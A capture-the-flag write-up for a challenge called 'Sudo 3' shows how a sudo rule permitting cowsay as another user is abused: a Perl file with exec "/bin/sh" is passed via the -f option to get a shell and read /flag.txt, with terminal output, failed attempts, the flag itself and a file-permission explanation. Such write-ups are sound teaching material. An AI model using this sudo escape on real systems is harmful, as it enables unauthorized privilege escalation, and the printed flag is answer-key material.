# Sudo 3

## Write-Up

First, when intering the instance, we can find the flag in the route `/` Folder :

```
ctf@sudo-3-f7977884c-g2sg4:~$ ls /
bin  boot  dev  etc  flag.txt  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

Also, when trying to read it, obviously we don't have permissions to do so :

```
ctf@sudo-3-f7977884c-g2sg4:~$ cat /flag.txt
cat: /flag.txt: Permission denied
```

So, intuitive thing to do is to check sudo rights for our user :

```
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -l
[sudo] password for ctf: 
Matching Defaults entries for ctf on sudo-3-f7977884c-g2sg4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ctf may run the following commands on sudo-3-f7977884c-g2sg4:
    (ctf-cracked) /usr/games/cowsay
```

### Playing Arround

 - cowsay is a program that generates ASCII art pictures of a cow with a message. It can also generate pictures using pre-made images of other animals, such as Tux the Penguin, the Linux mascot. It is written in Perl. There is also a related program called cowthink, with cows with thought bubbles rather than speech bubbles. .cow files for cowsay exist which are able to produce different variants of "cows", with different kinds of "eyes", and so forth. It is sometimes used on IRC, desktop screenshots, and in software documentation. It is more or less a joke within hacker culture, but has been around long enough that its use is rather widespread. In 2007, it was highlighted as a Debian package of the day

 - Let's play with it a lil bit :

```
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u  ctf-cracked /usr/games/cowsay /flag.txt
 ___________
< /flag.txt >
 -----------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

 - Here, as we can see, we can give variable as parameter to `cowsay`, but, unfortuantly, it is executing it with our permissions :

```
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u  ctf-cracked /usr/games/cowsay $(cat /flag.txt)
cat: /flag.txt: Permission denied
```

 - There are some funny options to change the expressions of the cow :

```
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u  ctf-cracked /usr/games/cowsay -d /flag.txt
 ___________
< /flag.txt >
 -----------
        \   ^__^
         \  (xx)\_______
            (__)\       )\/\
             U  ||----w |
                ||     ||
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u  ctf-cracked /usr/games/cowsay -p /flag.txt
 ___________
< /flag.txt >
 -----------
        \   ^__^
         \  (@@)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

```
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u ctf-cracked  /usr/games/cowsay -T U Hello
 _______
< Hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
             U ||----w |
                ||     ||
```

 - We can also execute `cowsay` inside `cowsay` :

```
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u  ctf-cracked /usr/games/cowsay $(sudo -u ctf-cracked /usr/games/cowsay -d /flag.txt)
 _________________________________________
/ ___________ < /flag.txt > ----------- \ \
| ^__^ \ (xx)\_______ (__)\ )\/\ U        |
\ ||----w | || ||                         /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

 - There is also `cowthink` that do same, but with thiking bubbles instead : 

```
ctf@sudo-3-f7977884c-g2sg4:~$ ls -l /usr/games
total 8
-rwxr-xr-x 1 root root 4664 May 11  2020 cowsay
lrwxrwxrwx 1 root root    6 May 11  2020 cowthink -> cowsay
ctf@sudo-3-f7977884c-g2sg4:~$ /usr/games/cowthink
^C
ctf@sudo-3-f7977884c-g2sg4:~$ /usr/games/cowthink hello
 _______
( hello )
 -------
        o   ^__^
         o  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
ctf@sudo-3-f7977884c-g2sg4:~$ /usr/games/cowsay
^C
ctf@sudo-3-f7977884c-g2sg4:~$ /usr/games/cowsay hello
 _______
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
ctf@sudo-3-f7977884c-g2sg4:~$ /usr/games/cowsay $(cat /flag.txt)
cat: /flag.txt: Permission denied
^C
ctf@sudo-3-f7977884c-g2sg4:~$ /usr/games/cowthink $(cat /flag.txt)
cat: /flag.txt: Permission denied
^C
ctf@sudo-3-f7977884c-g2sg4:~$ 

```

 - We may be attempted to execute with group permissions, since `flag.txt` has rights permission for `ctf-cracked` user, but, unsuccessful :

```
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u  ctf-cracked /usr/games/cowsay $(sudo -g ctf-cracked cat flag.txt )
Sorry, user ctf is not allowed to execute '/usr/bin/cat flag.txt' as ctf:ctf-cracked on sudo-3-f7977884c-g2sg4.
```

 - Redirections also doesn't work, it is actually the same as using `cat`, it READS the file :

```
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u  ctf-cracked /usr/games/cowsay < /flag.txt
-bash: /flag.txt: Permission denied
```

 - An interesting option though (that we will use later) is the `-f` option, that enables us to give file to `cowsay` so that she deisplays its content. In this case, it can't read it :

```
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u ctf-cracked  /usr/games/cowsay -f /flag.txt Hello Fedora
cowsay: Can't call method "shellmates" on an undefined value at /flag.txt line 1.
```


 - We can also check other commands :

```
ctf@sudo-3-f7977884c-g2sg4:~$ find / -perm -u=s -type f
find: ‘/run/lock’: Permission denied
find: ‘/run/sudo’: Permission denied
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
...
```

```
ctf@sudo-3-f7977884c-g2sg4:~$ newgrp ctf-cracked
Password: 
Invalid password.
```

```
ctf@sudo-3-f7977884c-g2sg4:/$ gpasswd --add ctf ctf-cracked
gpasswd: Permission denied.
```


### Solution

When try to do **Shell command execution** with `cowsay` by passing a shell variable as parameter : `command --option $(command2)` , the shell do this : it interprets which is $(), executes it (with your rights and your user), and we suppose the result of this executionn is X,  then it will replace the $() with X and run the command with the options with X, so the final command is command --options X, as you see here the two executions are equivalent :

```
ctf@sudo-3-f7977884c-g2sg4:~$ V=$(whoami)
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u  ctf-cracked /usr/games/cowsay $V
 _____
< ctf >
 -----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
ctf@sudo-3-f7977884c-g2sg4:
```

This unfortunatly leads us to nothing, since is is executed with rights of `ctf` and not `ctf-cracked`

But when we check from the tag of the challenge `gtfobins` :

 - GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. 

And when typing `cowsay` in search bar, we find the follwing : https://gtfobins.github.io/gtfobins/cowsay/ . So, we find out that `cowsay` command can **execute perl scripts.**

Knowing that `cowsay` can execute `perl` scripts with `-f` option, we can simply just pass it some script for opnning a shell or read a file :

```
ctf@sudo-3-f7977884c-g2sg4:~$ TF=$(mktemp)
ctf@sudo-3-f7977884c-g2sg4:~$ echo 'exec "cat /flag.txt";' >$TF
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u ctf-cracked  /usr/games/cowsay -f $TF x
 ___
< x >
 ---
```

Or :

```
ctf@sudo-3-f7977884c-g2sg4:~$ TF=$(mktemp)
ctf@sudo-3-f7977884c-g2sg4:~$ echo 'exec "/bin/sh";' >$TF
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u ctf-cracked  /usr/games/cowsay -f $TF x
 ___
< x >
 ---
```

Or :

```
ctf@sudo-3-f7977884c-g2sg4:~$ TF=$(mktemp)
ctf@sudo-3-f7977884c-g2sg4:~$ tee > $TF
#!/bin/perl
exec "/bin/sh";

^C
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u ctf-cracked  /usr/games/cowsay -f $TF x
 ___
< x >
 ---
ctf@sudo-3-f7977884c-g2sg4:~$ echo $TF
/tmp/tmp.Vu2i4wDJcF
ctf@sudo-3-f7977884c-g2sg4:~$ cat $TF
#!/bin/perl
exec "/bin/sh";
```

But unfortunatly, this won't work. Let's try with a manually created file :


```
ctf@sudo-3-f7977884c-g2sg4:~$ tee > /tmp/script
#!/bin/perl
exec "/bin/sh";
^C
ctf@sudo-3-f7977884c-g2sg4:~$ cat /tmp/script
#!/bin/perl
exec "/bin/sh";
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u ctf-cracked  /usr/games/cowsay -f /tmp/script
[sudo] password for ctf: 
^C
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u ctf-cracked  /usr/games/cowsay -f /tmp/script Hello
$ cat /flag.txt
shellmates{$uDO_G03s_m0OoOoo0OO0O0O0h}
$ exit
```

OR :

```
ctf@sudo-3-f7977884c-g2sg4:~$ touch /tmp/script
ctf@sudo-3-f7977884c-g2sg4:~$ echo 'exec "/bin/sh";' > /tmp/script
ctf@sudo-3-f7977884c-g2sg4:~$ sudo -u ctf-cracked  /usr/games/cowsay -f /tmp/script Hello
[sudo] password for ctf: 
$ cat flag.txt
cat: flag.txt: No such file or directory
$ cat /flag.txt
shellmates{$uDO_G03s_m0OoOoo0OO0O0O0h}
$ exit
```

### **Why doesn't `mktemp` work though ?** 

When using `mktemp` :

```
ctf@sudo-3-f7977884c-g2sg4:~$ ls -l /tmp/script
-rw-rw-r-- 1 ctf ctf 16 Dec 25 23:38 /tmp/script
ctf@sudo-3-f7977884c-g2sg4:~$ ls -l $TF
-rw------- 1 ctf ctf 0 Dec 25 23:38 /tmp/tmp.ZoJIyNtBrZ
```

Note that the manually created file has group and other rights and the `mktemp` created doesn't.

In reality, when we passe the file in the `-f`, if it doesn't have read rights then it can't read it, in consequence it can't execute the shell code. And with the file created with `mktemp`, and when you execute sudo with ctf-cracked user, he will try to read the file to execute it in the `cowsay` command, but, since the file you created owned by ctf and doesn't have other read permission, the user ctf-cracked can't read it, so, he won;t be able to execute the `perl` command in it.

To remediate to that, simlpy add other rights to read the file :

```
ctf@sudo-3-f7977884c-g2sg4:~$ TF=$(mktemp)
ctf@sudo-3-f7977884c-g2sg4:~$ ls -l $TF
-rw------- 1 ctf ctf 0 Dec 25 23:53 /tmp/tmp.mh712Krz2h
ctf@sudo-3-f7977884c-g2sg4:~$ chmod o+r $TF
ctf@sudo-3-f7977884c-g2sg4:~$ ls -l $TF
-rw----r-- 1 ctf ctf 0 Dec 25 23:53 /tmp/tmp.mh712Krz2h
```

Or, create the `/tmp` file manually using `touch`, which creates a file by default with other having read permission. This makes the ctf-cracked able to read it, and the `cowsay` command may read the file and execute the code in it.

## Flag

shellmates{$uDO_G03s_m0OoOoo0OO0O0O0h}

## More Information

https://gtfobins.github.io/gtfobins/cowsay/
https://gtfobins.github.io/gtfobins/perl/

Permissions in Linux : https://kb.iu.edu/d/abdb